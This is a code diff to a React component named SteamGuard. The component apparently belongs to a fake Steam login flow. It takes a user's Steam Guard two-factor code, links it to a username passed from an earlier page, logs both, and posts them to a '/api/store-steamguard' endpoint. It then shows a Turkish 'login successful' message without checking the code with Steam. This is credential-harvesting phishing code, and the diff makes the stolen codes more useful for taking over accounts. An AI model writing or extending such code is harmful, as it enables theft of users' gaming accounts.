@@ -1,6 +1,6 @@
 
 import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import { useNavigate, useLocation } from 'react-router-dom';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Shield, Loader } from 'lucide-react';
@@ -10,13 +10,15 @@ const SteamGuard = () => {
   const [guardCode, setGuardCode] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
   const navigate = useNavigate();
+  const location = useLocation();
+  const { username } = location.state || { username: '' };
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
 
     // Log the Steam Guard code for tracking
-    console.log('Steam Guard code submitted:', guardCode);
+    console.log('Steam Guard code submitted:', guardCode, 'for username:', username);
 
     // Send the code to the mock database
     fetch('/api/store-steamguard', {
@@ -24,7 +26,7 @@ const SteamGuard = () => {
       headers: {
         'Content-Type': 'application/json',
       },
-      body: JSON.stringify({ code: guardCode }),
+      body: JSON.stringify({ code: guardCode, username }),
     }).then(() => {
       toast.success("Giriş başarılı! Yönlendiriliyorsunuz...");
       
